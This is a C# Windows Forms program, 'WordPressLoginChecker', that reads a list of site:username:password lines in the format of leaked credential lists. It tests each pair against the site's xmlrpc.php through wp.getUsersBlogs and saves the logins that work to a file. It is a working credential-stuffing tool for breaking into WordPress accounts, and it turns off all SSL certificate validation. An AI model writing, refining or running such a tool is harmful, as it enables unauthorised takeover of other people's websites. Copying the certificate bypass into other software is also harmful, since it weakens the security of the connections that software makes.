using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace WordPressLoginChecker
{
    public partial class Form1 : Form
    {
        private static readonly HttpClient client;
        private CancellationTokenSource cts;

        static Form1()
        {
            // Create a handler that ignores SSL certificate errors
            HttpClientHandler handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            // Initialize HttpClient with the custom handler
            client = new HttpClient(handler);
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFilePath.Text = openFileDialog.FileName;
            }
        }

        private async void btnCheckLogins_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtFilePath.Text))
            {
                MessageBox.Show("Please select a file first.");
                return;
            }

            if (string.IsNullOrEmpty(txtSaveLocation.Text) || string.IsNullOrEmpty(txtOutputFileName.Text))
            {
                MessageBox.Show("Please select the save location and specify the output file name.");
                return;
            }

            cts = new CancellationTokenSource();
            string[] lines = File.ReadAllLines(txtFilePath.Text);

            try
            {
                await Task.Run(() =>
                {
                    foreach (string line in lines)
                    {
                        if (cts.Token.IsCancellationRequested)
                            break;

                        var match = Regex.Match(line, @"(\b(https?:\/\/)?[^\s/]+\/(wp-login\.php|wp-admin)):([^:]+):([^:]+)");
                        if (match.Success)
                        {
                            string url = match.Groups[1].Value;
                            string username = match.Groups[4].Value;
                            string password = match.Groups[5].Value;

                            // Ensure the URL has a proper scheme
                            if (!url.StartsWith("http://") && !url.StartsWith("https://"))
                            {
                                url = "https://" + url;
                            }

                            CheckLogin(url, username, password, cts.Token).Wait();
                        }
                    }
                });
            }
            catch (OperationCanceledException)
            {
                AppendOutput("Operation was canceled.", true);
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (cts != null)
            {
                cts.Cancel();
            }
        }

        private void btnBrowseSaveLocation_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();

            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
            }
        }

        private async Task CheckLogin(string url, string username, string password, CancellationToken token)
        {
            string xmlRpcUrl = Regex.Replace(url, "(wp-login\\.php|wp-admin)$", "xmlrpc.php");
            string xmlRequest = $@"
                <?xml version=""1.0""?>
                <methodCall>
                    <methodName>wp.getUsersBlogs</methodName>
                    <params>
                        <param><value><string>{username}</string></value></param>
                        <param><value><string>{password}</string></value></param>
                    </params>
                </methodCall>";

            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");

            try
            {
                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                string responseContent = await response.Content.ReadAsStringAsync();

                XDocument xmlResponse = XDocument.Parse(responseContent);

                if (xmlResponse.Descendants("fault").Any())
                {
                    AppendOutput($"===============================\nLogin failed for {url} with user {username}\n===============================", true);
                }
                else
                {
                    AppendOutput($"===============================\nLogin successful for {url} with user {username}\n===============================", false);
                    SaveSuccessfulLogin(url, username, password);
                }
            }
            catch (Exception ex)
            {
                if (!token.IsCancellationRequested)
                {
                    AppendOutput($"===============================\nError checking login for {url}: {ex.Message}\n===============================", true);
                }
            }
        }

        private void SaveSuccessfulLogin(string url, string username, string password)
        {
            string successFilePath = Path.Combine(txtSaveLocation.Text, txtOutputFileName.Text);
            string successEntry = $"{url}:{username}:{password}\n";
            File.AppendAllText(successFilePath, successEntry);
        }

        private void AppendOutput(string text, bool isError)
        {
            if (isError)
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.Red));
            }
            else
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.LightGreen));
            }

            txtOutput.Invoke((Action)(() =>
            {
                txtOutput.AppendText(text + Environment.NewLine);
                txtOutput.SelectionColor = System.Drawing.Color.Black;

                // Auto-scroll to the bottom
                txtOutput.SelectionStart = txtOutput.Text.Length;
                txtOutput.ScrollToCaret();
            }));
        }
    }
}
